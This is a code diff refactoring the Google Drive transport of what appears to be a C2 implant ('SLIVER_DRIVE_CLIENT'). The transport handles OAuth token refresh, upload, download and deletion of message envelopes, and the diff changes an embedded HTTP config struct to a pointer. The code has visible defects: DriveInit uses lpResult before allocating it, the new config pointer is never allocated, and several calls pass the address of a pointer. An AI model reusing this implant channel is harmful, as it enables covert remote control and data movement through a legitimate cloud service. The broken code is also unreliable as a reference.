@@ -14,7 +14,7 @@ BOOL RefreshAccessToken
 	LPSTR lpResult = NULL;
 	LPSTR lpContentTypeStr = NULL;
 
-	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveClient->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -22,7 +22,7 @@ BOOL RefreshAccessToken
 	SecureZeroMemory(lpBody, sizeof(lpBody));
 	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
 	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
-	pHttpResp = SendHttpRequest(&pDriveClient->HttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
+	pHttpResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
 	if (pHttpResp == NULL) {
 		goto CLEANUP;
 	}
@@ -32,11 +32,11 @@ BOOL RefreshAccessToken
 		goto CLEANUP;
 	}
 
-	if (pDriveClient->HttpConfig.lpAccessToken != NULL) {
-		FREE(pDriveClient->HttpConfig.lpAccessToken);
+	if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
+		FREE(pDriveClient->pHttpConfig->lpAccessToken);
 	}
 
-	pDriveClient->HttpConfig.lpAccessToken = lpResult;
+	pDriveClient->pHttpConfig->lpAccessToken = lpResult;
 	Result = TRUE;
 CLEANUP:
 	FreeHttpResp(pHttpResp);
@@ -76,15 +76,15 @@ PSLIVER_DRIVE_CLIENT DriveInit()
 	lpResult->DriveList[0]->lpClientSecret = DuplicateStrA(szClientSecret, 0);
 	lpResult->DriveList[0]->lpRefreshToken = DuplicateStrA(szRefreshToken, 0);
 
-	lpResult->HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
-	lpResult->HttpConfig.dwNumberOfAttemps = 10;
+	lpResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
+	lpResult->pHttpConfig->dwNumberOfAttemps = 10;
 	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
 	if (lpProxy != NULL) {
 		if (!lstrcmpA(lpProxy, "auto")) {
-			lpResult->HttpConfig.pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
+			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
 		}
 		else {
-			lpResult->HttpConfig.pProxyConfig = ProxyInit(UserProvided, lpProxy);
+			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
 		}
 
 		FREE(lpProxy);
@@ -182,7 +182,6 @@ PENVELOPE DriveRecv
 	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
 )
 {
-	PSLIVER_DRIVE_CLIENT pDriveClient = NULL;
 	PENVELOPE pResult = NULL;
 	CHAR szPattern[0x80];
 	PDRIVE_CONFIG pDriveConfig = NULL;
@@ -244,7 +243,7 @@ BOOL DriveUpload
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -279,7 +278,7 @@ BOOL DriveUpload
 			continue;
 		}
 		
-		pResp = SendHttpRequest(&pDriveClient->HttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
+		pResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
 		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
 			FreeHttpResp(pResp);
 			continue;
@@ -334,7 +333,7 @@ BOOL GetFileId
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -379,7 +378,7 @@ BOOL DriveDelete
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -417,7 +416,7 @@ PBUFFER DriveDownload
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -432,7 +431,7 @@ PBUFFER DriveDownload
 			continue;
 		}
 
-		pResp = SendHttpRequest(&pDriveClient->HttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
+		pResp = SendHttpRequest(&pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
 		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 			FreeHttpResp(pResp);
 			continue;
@@ -482,17 +481,17 @@ BOOL FreeDriveClient
 			pDriveClient->DriveList[i] = NULL;
 		}
 
-		if (pDriveClient->HttpConfig.lpUserAgent != NULL) {
-			FREE(pDriveClient->HttpConfig.lpUserAgent);
+		if (pDriveClient->pHttpConfig->lpUserAgent != NULL) {
+			FREE(pDriveClient->pHttpConfig->lpUserAgent);
 		}
 
-		if (pDriveClient->HttpConfig.lpAccessToken != NULL) {
-			FREE(pDriveClient->HttpConfig.lpAccessToken);
+		if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
+			FREE(pDriveClient->pHttpConfig->lpAccessToken);
 		}
 
-		for (i = 0; i < _countof(pDriveClient->HttpConfig.AdditionalHeaders); i++) {
-			if (pDriveClient->HttpConfig.AdditionalHeaders[i] != NULL) {
-				FREE(pDriveClient->HttpConfig.AdditionalHeaders[i]);
+		for (i = 0; i < _countof(pDriveClient->pHttpConfig->AdditionalHeaders); i++) {
+			if (pDriveClient->pHttpConfig->AdditionalHeaders[i] != NULL) {
+				FREE(pDriveClient->pHttpConfig->AdditionalHeaders[i]);
 			}
 		}
 
